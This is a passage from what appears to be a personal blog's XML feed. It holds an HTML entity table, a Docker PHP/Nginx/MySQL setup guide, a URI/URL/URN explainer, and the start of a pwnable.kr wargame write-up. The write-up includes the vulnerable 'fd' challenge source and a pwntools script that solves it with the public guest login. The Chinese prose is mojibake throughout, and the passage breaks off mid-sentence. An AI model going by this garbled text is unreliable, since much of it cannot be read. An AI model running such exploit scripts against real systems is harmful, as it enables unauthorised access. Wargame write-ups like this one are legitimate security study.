style="text-align:left">æ— é™å¤§ç¬¦å·</td><td style="text-align:left"><code>&amp;infin;</code></td></tr><tr><td style="text-align:left">&ang;</td><td style="text-align:left">è§’åº¦ç¬¦å·</td><td style="text-align:left"><code>&amp;ang;</code></td></tr><tr><td style="text-align:left">&int;</td><td style="text-align:left">å¾®ç§¯åˆ†ç¬¦å·</td><td style="text-align:left"><code>&amp;int;</code></td></tr><tr><td style="text-align:left">&iquest;</td><td style="text-align:left">å€’é—®å·</td><td style="text-align:left"><code>&amp;iquest;</code></td></tr><tr><td style="text-align:left">&ne;</td><td style="text-align:left">ä¸ç­‰äºç¬¦å·</td><td style="text-align:left"><code>&amp;ne;</code></td></tr><tr><td style="text-align:left">&equiv;</td><td style="text-align:left">ç›¸ç­‰ç¬¦å·</td><td style="text-align:left"><code>&amp;equiv;</code></td></tr><tr><td style="text-align:left">&le;</td><td style="text-align:left">å°äºç­‰äºç¬¦å·</td><td style="text-align:left"><code>&amp;le;</code></td></tr><tr><td style="text-align:left">&ge;</td><td style="text-align:left">å¤§äºç­‰äºç¬¦å·</td><td style="text-align:left"><code>&amp;ge;</code></td></tr><tr><td style="text-align:left">&para;</td><td style="text-align:left">æ®µè½ç¬¦å·</td><td style="text-align:left"><code>&amp;para;</code></td></tr><tr><td style="text-align:left">&sect;</td><td style="text-align:left">ç« èŠ‚ç¬¦å·</td><td style="text-align:left"><code>&amp;sect;</code></td></tr><tr><td style="text-align:left">&perp;</td><td style="text-align:left">å‚ç›´ç¬¦å·</td><td style="text-align:left"><code>&amp;perp;</code></td></tr><tr><td style="text-align:left">&copy;</td><td style="text-align:left">ç‰ˆæƒæ‰€æœ‰ç¬¦å·</td><td style="text-align:left"><code>&amp;copy;</code></td></tr><tr><td style="text-align:left">&trade;</td><td style="text-align:left">å•†æ ‡ç¬¦å·</td><td style="text-align:left"><code>&amp;trade;</code></td></tr><tr><td style="text-align:left">&reg;</td><td style="text-align:left">æ³¨å†Œå•†æ ‡ç¬¦å·</td><td style="text-align:left"><code>&amp;reg;</code></td></tr><tr><td style="text-align:left">&frac12;</td><td style="text-align:left">äºŒåˆ†ä¹‹ä¸€ç¬¦å·</td><td style="text-align:left"><code>&amp;frac12;</code></td></tr><tr><td style="text-align:left">&permil;</td><td style="text-align:left">ç™¾åˆ†ç¬¦å·</td><td style="text-align:left"><code>&amp;permil;</code></td></tr><tr><td style="text-align:left">&there4;</td><td style="text-align:left">æ‰€ä»¥ç¬¦å·</td><td style="text-align:left"><code>&amp;there4;</code></td></tr><tr><td style="text-align:left">&pi;</td><td style="text-align:left">åœ†å‘¨ç‡ç¬¦å·</td><td style="text-align:left"><code>&amp;pi;</code></td></tr><tr><td style="text-align:left">&alpha;</td><td style="text-align:left">Alpha ç¬¦å·</td><td style="text-align:left"><code>&amp;alpha;</code></td></tr><tr><td style="text-align:left">&beta;</td><td style="text-align:left">Bata ç¬¦å·</td><td style="text-align:left"><code>&amp;beta;</code></td></tr><tr><td style="text-align:left">&gamma;</td><td style="text-align:left">Gamma ç¬¦å·</td><td style="text-align:left"><code>&amp;gamma;</code></td></tr><tr><td style="text-align:left">&Delta;</td><td style="text-align:left">Delta ç¬¦å·</td><td style="text-align:left"><code>&amp;Delta;</code></td></tr><tr><td style="text-align:left">&theta;</td><td style="text-align:left">Theta ç¬¦å·</td><td style="text-align:left"><code>&amp;theta;</code></td></tr><tr><td style="text-align:left">&lambda;</td><td style="text-align:left">Lambda ç¬¦å·</td><td style="text-align:left"><code>&amp;lambda;</code></td></tr><tr><td style="text-align:left">&Sigma;</td><td style="text-align:left">Sigma ç¬¦å·</td><td style="text-align:left"><code>&amp;Sigma;</code></td></tr><tr><td style="text-align:left">&tau;</td><td style="text-align:left">Tau ç¬¦å·</td><td style="text-align:left"><code>&amp;tau;</code></td></tr></tbody></table><p>å†è®°å½•ä¸€ä¸ªå¼‚æˆ–ç¬¦å·ï¼šâŠ•</p><p>å‚è€ƒæ–‡ç« ï¼š</p><blockquote><p><a href="https://www.jianshu.com/p/80ac23666a98" target="_blank" rel="noopener">å¦‚ä½•åœ¨markdownä¸­æ‰“å‡ºä¸Šæ ‡ã€ä¸‹æ ‡å’Œä¸€äº›ç‰¹æ®Šç¬¦å·</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æƒ³è¦æ‰“å‡ºå¥‡å¥‡æ€ªæ€ªçš„ç¬¦å· :D&lt;/p&gt;
    
    </summary>
    
      <category term="å°ç¬”è®°" scheme="https://cyris.pen.moe/categories/%E5%B0%8F%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Notebook" scheme="https://cyris.pen.moe/tags/Notebook/"/>
    
  </entry>
  
  <entry>
    <title>åˆ©ç”¨ Dokcer éƒ¨ç½² PHP å¼€å‘ç¯å¢ƒ</title>
    <link href="https://cyris.pen.moe/posts/docker-php/"/>
    <id>https://cyris.pen.moe/posts/docker-php/</id>
    <published>2018-03-19T06:28:15.000Z</published>
    <updated>2018-04-04T16:58:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>åˆ©ç”¨ Docker æ‰‹åŠ¨é…ç½® PHP + Njinx + MySQL å¼€å‘ç¯å¢ƒã€‚</p><a id="more"></a><p>æ‰‹åŠ¨é…ç½®çš„æ–¹æ³•ä¸ºï¼šå…ˆæ‹‰å–ä¸€ä¸ª ubuntu é•œåƒå¹¶åˆ›å»ºç›¸åº”çš„å®¹å™¨ï¼Œåœ¨å®¹å™¨å†…éƒ¨è¿›è¡Œ PHP ç›¸å…³ç¯å¢ƒéƒ¨ç½²ã€‚å…³äº docker çš„è¯´æ˜ä»¥åŠå…·ä½“çš„å®‰è£…çš„æ–¹æ³•è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚</p><p>æ›´æ–°ï¼šä¸€æ¬¡ docker-compose çš„å®è·µï¼š<a href="https://github.com/iCyris/Ezdock.git" target="_blank" rel="noopener">Ezdock</a></p><h2 id="1-å®‰è£…-docker"><a href="#1-å®‰è£…-docker" class="headerlink" title="1. å®‰è£… docker"></a>1. å®‰è£… docker</h2><p>å¦‚æœæ˜¯åœ¨æœåŠ¡å™¨ç«¯ï¼ˆä»¥ ubuntu ä¸ºä¾‹ï¼‰ï¼Œå®‰è£… docker çš„åŸºç¡€æ“ä½œæœ‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y docker.io       <span class="comment">#å®‰è£…docker</span></span><br><span class="line">service docker start                    <span class="comment">#å¯åŠ¨docker</span></span><br><span class="line">service docker stop                     <span class="comment">#å…³é—­docker</span></span><br></pre></td></tr></table></figure><p>ç®€å•è¯´ä¸€ä¸‹ image ä¸ container çš„åŒºåˆ«ã€‚å‰è€…ä¸ºé•œåƒï¼Œåè€…ä¸ºå®¹å™¨ï¼Œå®¹å™¨åŸºäºé•œåƒï¼Œè€Œæˆ‘ä»¬å¹³æ—¶ç”¨çš„ docker run å‘½ä»¤æ˜¯ä»å·²æœ‰é•œåƒä¸­å¼€å¯ä¸€ä¸ªæ–°çš„å®¹å™¨ã€‚</p><h2 id="2-æ‹‰å–é•œåƒ"><a href="#2-æ‹‰å–é•œåƒ" class="headerlink" title="2. æ‹‰å–é•œåƒ"></a>2. æ‹‰å–é•œåƒ</h2><p>docker æˆåŠŸè¿è¡Œä»¥åï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull ubuntu </span><br><span class="line"><span class="comment">#ä¸æŒ‡å®šç‰ˆæœ¬ï¼Œç›´æ¥æ‹‰å–ä¸€ä¸ª ubuntu æœ€æ–°çš„ image ï¼Œå¦‚éœ€æŒ‡å®šç‰ˆæœ¬å¯ä»¥ç”¨ ubuntu:16.04 çš„æ–¹å¼ã€‚</span></span><br></pre></td></tr></table></figure><h2 id="3-åˆ›å»ºæµ‹è¯•å®¹å™¨"><a href="#3-åˆ›å»ºæµ‹è¯•å®¹å™¨" class="headerlink" title="3. åˆ›å»ºæµ‹è¯•å®¹å™¨"></a>3. åˆ›å»ºæµ‹è¯•å®¹å™¨</h2><p>ç°åœ¨æˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ª ubuntu çš„é•œåƒï¼Œæ¥ä¸‹æ¥åˆ›å»ºæµ‹è¯•å®¹å™¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo docker images  <span class="comment">#æŸ¥çœ‹æ‰€æœ‰é•œåƒ</span></span><br><span class="line">sudo docker run -i -t --name=<span class="string">"my_ubuntu"</span> image_id /bin/bash  </span><br><span class="line"><span class="comment">#  åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡Œï¼Œå¦‚æœéœ€è¦æ˜ å°„ç«¯å£å¯ä»¥åŠ ä¸Š -p å‚æ•°ï¼ˆå¦‚ -p 8083:80 ï¼Œå‰è€…ä¸ºä¸»æœºç«¯å£ï¼Œåè€…ä¸ºå®¹å™¨ç«¯å£ï¼‰ã€‚</span></span><br><span class="line"><span class="comment">#  -i: ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t åŒæ—¶ä½¿ç”¨ï¼›</span></span><br><span class="line"><span class="comment">#  -t: ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨ï¼›</span></span><br><span class="line"><span class="comment">#  --name="my_ubuntu": ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°ï¼›</span></span><br><span class="line">sudo docker ps  <span class="comment">#æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span></span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œå½“æˆ‘ä»¬ exit ä¸€ä¸ªå®¹å™¨æ—¶ï¼Œå› ä¸ºæ²¡æœ‰åŠ  -d å‚æ•°ï¼Œæ‰€ä»¥å®¹å™¨ä¹Ÿä¼š stop ï¼Œå¦‚æœéœ€è¦å†æ¬¡è¿›å…¥å¯ä»¥å…ˆå¯åŠ¨å®¹å™¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start container_id</span><br></pre></td></tr></table></figure><p>ç„¶åæœ‰ä¸¤ç§æ–¹æ³•é‡æ–°è¿›å…¥äº¤äº’çŠ¶æ€ï¼Œdocker attach ä¸ docker exec -it ã€‚ç”¨å‰è€…è¿›å…¥ container æ—¶å¦‚æœé€€å‡ºäº†å®¹å™¨ï¼Œå®ƒä¾ç„¶ä¼š stop ï¼Œè€Œç”¨åé¢çš„æ–¹å¼è¿›å…¥å®¹å™¨å³ä½¿é€€å‡ºäº†äº¤äº’ç•Œé¢ container ä»ç„¶ä¼šåœ¨åå°è¿è¡Œã€‚å®Œæ•´å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it container_id /bin/bash</span><br></pre></td></tr></table></figure><h2 id="4-ç¯å¢ƒæ­å»º"><a href="#4-ç¯å¢ƒæ­å»º" class="headerlink" title="4. ç¯å¢ƒæ­å»º"></a>4. ç¯å¢ƒæ­å»º</h2><p>ç°åœ¨æˆ‘ä»¬å·²ç»è¿›å…¥äº†ä¸€ä¸ªå®¹å™¨ä¸­ï¼Œä¸‹é¢å®‰è£… PHP + Nginx + MySQL çš„ç¯å¢ƒï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install nginx</span><br><span class="line">apt-get install mysql-server</span><br><span class="line">apt-get install php</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿æµ‹è¯•å¯ä»¥è‡ªè¡Œ apt-get install net-tools, vim, curl, unzip ç­‰å·¥å…·ã€‚</p><h2 id="5-ä¼ è¾“å†™å¥½çš„ä»£ç "><a href="#5-ä¼ è¾“å†™å¥½çš„ä»£ç " class="headerlink" title="5. ä¼ è¾“å†™å¥½çš„ä»£ç "></a>5. ä¼ è¾“å†™å¥½çš„ä»£ç </h2><p>å¦‚æœæƒ³è¦ä¼ è¾“å†™å¥½çš„ä»£ç åˆ°æœåŠ¡å™¨ä¸Šæˆ–è€…åˆ° docker ä¸­ï¼Œæœ‰å‡ æ¡å‘½ä»¤ï¼š</p><p>ä¼ è¾“åˆ°æœåŠ¡å™¨ä¸Šï¼ˆæœ€å¥½å…ˆæ‰“åŒ…ä¸º zip ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp local_file remote_username@remote_ip:remote_path</span><br></pre></td></tr></table></figure><p>ä¼ å…¥ docker å®¹å™¨ä¸­ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">å°†ä¸»æœº /www/runoob ç›®å½•æ‹·è´åˆ°å®¹å™¨ 96f7f14e99ab çš„ /www ç›®å½•ä¸‹ï¼š</span><br><span class="line">docker cp /www/runoob 96f7f14e99ab:/www/</span><br><span class="line"></span><br><span class="line">å°†ä¸»æœº /www/runoob ç›®å½•æ‹·è´åˆ°å®¹å™¨ 96f7f14e99ab ä¸­ï¼Œç›®å½•é‡å‘½åä¸º www ï¼š</span><br><span class="line">docker cp /www/runoob 96f7f14e99ab:/www</span><br><span class="line"></span><br><span class="line">å°†å®¹å™¨ 96f7f14e99ab çš„ /www ç›®å½•æ‹·è´åˆ°ä¸»æœºçš„ /tmp ç›®å½•ä¸­ï¼š</span><br><span class="line">docker cp  96f7f14e99ab:/www /tmp/</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä»£ç è§£å‹è‡³å®¹å™¨ä¸­ /var/www/html/ ç›®å½•ä¸‹ï¼Œä½†æ­¤æ—¶è®¿é—® php ä¼šç›´æ¥å¼¹å‡ºä¸‹è½½è€Œéè§£æï¼Œéœ€è¦ä¿®æ”¹ä¸‹ nginx çš„é…ç½®æ–‡ä»¶ï¼Œè¿›å…¥ /etc/nginx/sites-enabled/default ï¼Œä¿®æ”¹ php éƒ¨åˆ†ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    fastcgi_pass unix:/run/php/php7.0-fpm.sock;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  /var/www/html<span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é‡å¯ä¸‹ nginx å°±å¯ä»¥è§£æ php äº†ï¼Œå…¶ä»–çš„é…ç½®ç½‘ä¸Šå·²ç»æœ‰å¾ˆå¤šçš„æ•™ç¨‹ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚</p><h2 id="6-å‡ æ¡æœåŠ¡é‡å¯å‘½ä»¤"><a href="#6-å‡ æ¡æœåŠ¡é‡å¯å‘½ä»¤" class="headerlink" title="6. å‡ æ¡æœåŠ¡é‡å¯å‘½ä»¤"></a>6. å‡ æ¡æœåŠ¡é‡å¯å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/mysql restart</span><br><span class="line">/etc/init.d/nginx restart</span><br><span class="line">/etc/init.d/php7.0-fpm restart</span><br></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š</p><blockquote><p><a href="http://c014.cn/2017/11/11/%E4%BB%8E%E9%9B%B6%E5%AD%A6%E4%B9%A0docker%E9%83%A8%E7%BD%B2%E7%8E%AF%E5%A2%83/" target="_blank" rel="noopener">ä»é›¶å­¦ä¹ Dockeréƒ¨ç½²ç¯å¢ƒ</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åˆ©ç”¨ Docker æ‰‹åŠ¨é…ç½® PHP + Njinx + MySQL å¼€å‘ç¯å¢ƒã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="å°ç¬”è®°" scheme="https://cyris.pen.moe/categories/%E5%B0%8F%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Notebook" scheme="https://cyris.pen.moe/tags/Notebook/"/>
    
  </entry>
  
  <entry>
    <title>å°è°ˆ URIã€URL ä¸ URN</title>
    <link href="https://cyris.pen.moe/posts/url-talk/"/>
    <id>https://cyris.pen.moe/posts/url-talk/</id>
    <published>2018-03-18T08:37:08.000Z</published>
    <updated>2018-03-29T16:28:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>Talk about URL. ğŸ¥</p><a id="more"></a> <h2 id="0x00-å¼•è¨€"><a href="#0x00-å¼•è¨€" class="headerlink" title="0x00 å¼•è¨€"></a>0x00 å¼•è¨€</h2><p>å°ç§‘æ™®å¸–ã€‚</p><p>æˆ‘ä»¬ä¸€èˆ¬å¯¹ URL æ¯”è¾ƒç†Ÿæ‚‰ï¼Œä½†å¾ˆå°‘äº†è§£ URI ä¸ URN ï¼Œä»¥åŠè¿™ä¸‰è€…ä¹‹é—´çš„å…³ç³»ï¼Œå…ˆæ”¾ä¸€å¼ å®ƒä»¬çš„å…³ç³»å›¾ï¼š</p><p><img src="/posts/url-talk/relation.png" alt=""></p><h2 id="0x01-æ¦‚å¿µ"><a href="#0x01-æ¦‚å¿µ" class="headerlink" title="0x01 æ¦‚å¿µ"></a>0x01 æ¦‚å¿µ</h2><p>ä¸‰ä¸ªåè¯çš„å®šä¹‰ï¼š</p><ol><li><p>URI (Uniform Resource Identifier) : ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ã€‚æ˜¯ä¸€ä¸ªç”¨äºæ ‡è¯†æŸä¸€äº’è”ç½‘èµ„æºåç§°çš„å­—ç¬¦ä¸²ã€‚ è¯¥ç§æ ‡è¯†å…è®¸ç”¨æˆ·å¯¹ç½‘ç»œä¸­ï¼ˆä¸€èˆ¬æŒ‡ä¸‡ç»´ç½‘ï¼‰çš„èµ„æºé€šè¿‡ç‰¹å®šçš„åè®®è¿›è¡Œäº¤äº’æ“ä½œã€‚</p></li><li><p>URL (Uniform Resource Locator) : ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼ˆæˆ–ç§°ç»Ÿä¸€èµ„æºå®šä½å™¨/å®šä½åœ°å€ã€URL åœ°å€ç­‰ï¼‰ã€‚æœ‰æ—¶ä¹Ÿè¢«ä¿—ç§°ä¸ºç½‘é¡µåœ°å€ï¼ˆç½‘å€ï¼‰ã€‚å¦‚åŒåœ¨ç½‘ç»œä¸Šçš„é—¨ç‰Œï¼Œæ˜¯å› ç‰¹ç½‘ä¸Šæ ‡å‡†çš„èµ„æºçš„åœ°å€ï¼ˆAddressï¼‰ã€‚</p></li><li><p>URN (Uniform Resource Name) : ç»Ÿä¸€èµ„æºåç§°ï¼Œæ˜¯ç»Ÿä¸€èµ„æºæ ‡è¯†ï¼ˆURIï¼‰çš„å†å²åå­—ï¼Œå®ƒä½¿ç”¨ urn: ä½œä¸º URI schemeã€‚</p></li></ol><p>ç®€å•åœ°è¯´ï¼ŒURI å¯è¢«è§†ä¸ºå®šä½ç¬¦ï¼ˆURLï¼‰ï¼Œåç§°ï¼ˆURNï¼‰æˆ–ä¸¤è€…å…¼å¤‡ã€‚</p><p>ç»Ÿä¸€èµ„æºåï¼ˆURNï¼‰å¦‚åŒä¸€ä¸ªäººçš„åç§°ï¼Œè€Œç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼ˆURLï¼‰ä»£è¡¨ä¸€ä¸ªäººçš„ä½å€ã€‚æ¢è¨€ä¹‹ï¼ŒURN å®šä¹‰æŸäº‹ç‰©çš„èº«ä»½ï¼Œè€Œ URL æä¾›æŸ¥æ‰¾è¯¥äº‹ç‰©çš„æ–¹æ³•ã€‚å¦‚æœè§‰å¾—è¿™æ ·è¯´æœ‰ç‚¹ç»•ï¼Œé‚£æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•ç”¨ä¸€å¥è¯åŒºåˆ† URL ä¸ URIã€‚</p><h2 id="0x02-ä¸€å¥è¯åŒºåˆ†-URL-ä¸-URI"><a href="#0x02-ä¸€å¥è¯åŒºåˆ†-URL-ä¸-URI" class="headerlink" title="0x02 ä¸€å¥è¯åŒºåˆ† URL ä¸ URI"></a>0x02 ä¸€å¥è¯åŒºåˆ† URL ä¸ URI</h2><p>URL æ˜¯ URI çš„å­é›†ã€‚</p><p>ä»»ä½•ä¸œè¥¿åªè¦èƒ½å¤Ÿå”¯ä¸€åœ°æ ‡è¯†å‡ºæ¥ï¼Œéƒ½å¯ä»¥è¯´è¿™ä¸ªæ ‡è¯†æ˜¯ URI ã€‚å¦‚æœè¿™ä¸ªæ ‡è¯†è¿˜èƒ½è·å–åˆ°ä¸Šè¿°å¯¹è±¡çš„è·¯å¾„ï¼Œé‚£ä¹ˆå®ƒåŒæ—¶è¿˜å¯ä»¥æ˜¯ä¸€ä¸ª URL ã€‚ä½†æ˜¯å¦‚æœå®ƒä¸èƒ½æä¾›è·å–åˆ°å¯¹è±¡çš„è·¯å¾„ï¼Œé‚£ä¹ˆå®ƒå¿…ç„¶ä¸æ˜¯ URL ã€‚</p><p>å³ URI ä¸ URL éƒ½å®šä¹‰äº† what the resource isï¼Œè€Œ URL è¿˜è¦åŒ…å« where (the resource is) ä¸ how (to get the resource) ã€‚</p><h2 id="0x03-æ —å­æ —å­"><a href="#0x03-æ —å­æ —å­" class="headerlink" title="0x03 æ —å­æ —å­"></a>0x03 æ —å­æ —å­</h2><p>æ¯”å¦‚ç°åœ¨æœ‰ä¸€ä¸ªç½‘ç«™ï¼š<a href="https://cyris.cn/dir/filename.html" target="_blank" rel="noopener">https://cyris.cn/dir/filename.html</a> ã€‚</p><p>å…¶ä¸­ dir/filename.html å°±æ˜¯ä¸€ä¸ª URI ï¼Œè€Œæ•´ä¸ªé“¾æ¥å°±æ˜¯ä¸€ä¸ª URL ï¼Œå®ƒåŒ…å«äº†æŒ‡å®šä»€ä¹ˆåè®®ï¼ˆhttpsï¼‰ï¼Œåœ¨å“ªä¸ªç«™ç‚¹ï¼ˆcyris.cnï¼‰ï¼Œå»è·å–ä»€ä¹ˆèµ„æºï¼ˆdir/filename.htmlï¼‰ã€‚</p><p>æ­£å¦‚ä¸Šé¢æ‰€è¯´ï¼ŒURI åªè¦æ˜¯èƒ½å”¯ä¸€æ ‡è¯†èµ„æºå³å¯ï¼Œè€Œ URL åŒ…æ‹¬äº† whereï¼Œhowï¼Œwhat ä¸‰è€…ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Talk about URL. ğŸ¥&lt;/p&gt;
    
    </summary>
    
      <category term="å°ç¬”è®°" scheme="https://cyris.pen.moe/categories/%E5%B0%8F%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Notebook" scheme="https://cyris.pen.moe/tags/Notebook/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr writeup</title>
    <link href="https://cyris.pen.moe/posts/pwnable-kr/"/>
    <id>https://cyris.pen.moe/posts/pwnable-kr/</id>
    <published>2018-03-12T06:25:28.000Z</published>
    <updated>2018-05-13T11:39:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>å­¦ä¹ ä¸€ä¸‹ Pwn ã€‚</p><p>ç½‘å€ï¼š<a href="http://pwnable.kr" target="_blank" rel="noopener">http://pwnable.kr</a></p><a id="more"></a><h1 id="Toddlerâ€™s-Bottle"><a href="#Toddlerâ€™s-Bottle" class="headerlink" title="[Toddlerâ€™s Bottle]"></a>[Toddlerâ€™s Bottle]</h1><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><blockquote><p>Mommy! what is a file descriptor in Linux?</p><ul><li>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: <a href="https://www.youtube.com/watch?v=blAxTfcW9VU" target="_blank" rel="noopener">https://www.youtube.com/watch?v=blAxTfcW9VU</a></li></ul><p>ssh fd@pwnable.kr -p2222 (pw:guest)</p></blockquote><p>ç»™å‡ºäº†æºç  :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ä¸€ä¸‹ file descriptor ï¼š</p><table><thead><tr><th style="text-align:left">Integer value</th><th style="text-align:left">Name</th><th style="text-align:left"><unistd.h> symbolic constant</unistd.h></th><th style="text-align:left"><stdio.h> file stream</stdio.h></th></tr></thead><tbody><tr><td style="text-align:left">0</td><td style="text-align:left">Standard input</td><td style="text-align:left">STDIN_FILENO</td><td style="text-align:left">stdin</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">Standard output</td><td style="text-align:left">STDOUT_FILENO</td><td style="text-align:left">stdout</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">error</td><td style="text-align:left">STDERR_FILENO</td><td style="text-align:left">stderr</td></tr></tbody></table><p>æ ‡å‡† io ä¸­ï¼Œread å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ä¸º 0 ï¼ˆå³æ ‡å‡†è¾“å…¥ï¼‰ï¼Œ0x1234 è½¬æ¢ä¸ºåè¿›åˆ¶ä¸º 4660 ï¼Œå¦å¤– buf éœ€è¦ç­‰äº â€œLETMEWIN\nâ€ ï¼Œpoc å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwn_ssh = ssh(host = <span class="string">'pwnable.kr'</span>, user = <span class="string">'fd'</span>, password = <span class="string">'guest'</span>, port = <span class="number">2222</span>)</span><br><span class="line"><span class="keyword">print</span> (pwn_ssh.connected())</span><br><span class="line"></span><br><span class="line">sh = pwn_ssh.process(argv = [<span class="string">'fd'</span>,<span class="string">'4660'</span>], executable = <span class="string">'./fd'</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">"LETMEWIN"</span>)</span><br><span class="line"><span class="keyword">print</span> (sh.recvall())</span><br></pre></td></tr></table></figure><p><code>mommy! I think I know what a file descriptor is!!</code></p><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><blockquote><p>Daddy told me about cool MD5 